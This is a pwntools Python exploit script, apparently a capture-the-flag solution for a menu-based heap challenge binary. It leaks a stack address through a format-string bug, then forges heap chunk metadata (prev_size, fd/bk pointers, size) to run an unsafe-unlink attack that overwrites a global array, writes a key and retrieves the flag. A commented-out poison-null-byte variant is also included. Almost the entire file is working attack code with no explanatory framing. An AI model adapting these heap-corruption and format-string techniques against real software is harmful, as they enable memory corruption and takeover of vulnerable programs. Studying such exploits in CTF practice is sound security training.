#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = ""
PORT = 1234

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size):
    sl(p, b"1")
    sl(p,b"%i" % size)
    ru(p,b">")

def edit(p, index, value):
    sl(p,b"2")
    sl(p,"%i" % index)
    ru(p,b"String >")
    sl(p,value)
    ru(p, b">")

def delete(p, index):
    sl(p,b"4")
    sl(p,"%i" % index)
    ru(p, b">")

def view(p, index):
    sl(p,b"3")
    ru(p, b"Index >")
    sl(p,"%i" % index)
    
    val = rl(p)
    ru(p, b">")

    return val[1:-1]


def exploit(io,e): 
    # unsafe unlink (it is literally that shrimple)
    create(io, 0x38) # 0
    create(io, 0xf8) # 1
    create(io, 0x18) # 2 stops top chunk consolidation

    # stack leak at $15%p - (0xd918 - 0xd828)
    edit(io, 0, b"%15$p")
    key = int(view(io, 0), 16) - (0xd918 - 0xd828)
    
    # change prev_inuse flag
    edit(io, 0, b"A" * 0x40)
    
    # fake prev_size
    for i in range(7):
        edit(io, 0, b"A"*(0x36 - i) + b"\x30\x00")

    # create fake fd and bk
    target = 0x204db0
    for i in range(5):
        edit(io, 0, b"A"*(0x1c - i) + p64(target))

    for i in range(5):
        edit(io, 0, b"A"*(0x14 - i) + p64(target - 8))
    
    # fake size field
    for i in range(7):
        edit(io, 0, b"A"*(0xe - i) + b"\x30\x00")

    # consolidate
    delete(io, 1)

    # write key to strings and edit it
    edit(io, 0, b"A"*0x18 + p64(key))
    edit(io, 0, p64(0xcafebabe))

    # get flag
    sl(io, b"5")

    '''
    # google poison null byte
    create(io, 0x18) # 0
    create(io, 0x208) # 1
    create(io, 0x88) # 2 
    create(io, 0x18) # 3 (stops top chunk consolidation)
    
    delete(io, 1)
    edit(io, 0, b"A"*0x20) # poison null byte

    # remaindered chunks
    create(io, 0xf8) # 4
    create(io, 0xf8) # 5
     
    # create consolidation + overlap
    strings_arr_target = 0x204dd0
    
    # program uses strcpy lol
    # overwrite fd and bk
    edit(io, 4, b"A"*10 + p64(strings_arr_target))
    edit(io, 4, b"A"*9 + p64(strings_arr_target))
    edit(io, 4, b"A"*8 + p64(strings_arr_target))
    edit(io, 4, b"AAAA" + p64(strings_arr_target + 8))
    edit(io, 4, b"AAA" + p64(strings_arr_target + 8))
    edit(io, 4, b"AA" + p64(strings_arr_target + 8))
    edit(io, 4, b"A" + p64(strings_arr_target + 8))
    edit(io, 4, p64(strings_arr_target + 8))

    delete(io, 2)
    
     
    # set pointers to a chunk that is in use
    create(io, 0xf8) # 6

    # chunk 5 has control over fd and bk pointers now
    # stack leak at $15%p - (0xd918 - 0xd828)
    edit(io, 0, b"%15$p")
    target = int(view(io, 0), 16) - (0xd918 - 0xd828)
    main_arena = int.from_bytes(view(io, 5)[:-6], "little")
    strings_arr_target = 0x204dd0

    # program uses strcpy lol
    # overwrite fd and bk
    edit(io, 5, b"A"*10 + p64(strings_arr_target - 8))
    edit(io, 5, b"A"*9 + p64(strings_arr_target - 8))
    edit(io, 5, b"A"*8 + p64(strings_arr_target - 8))
    edit(io, 5, b"AAAA" + p64(strings_arr_target + 8))
    edit(io, 5, b"AAA" + p64(strings_arr_target + 8))
    edit(io, 5, b"AA" + p64(strings_arr_target + 8))
    edit(io, 5, b"A" + p64(strings_arr_target + 8))
    edit(io, 5, p64(strings_arr_target + 8))

    create(io, 0x198) # 7
    '''
    '''
    # overwrite 0x30 smallbin?
    edit(io, 5, b"A"*0x18 + p64(target))
    edit(io, 5, b"A"*0x11 + p64(main_arena + 0x10))
    edit(io, 5, b"A"*0x10 + p64(main_arena + 0x10))
    '''

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
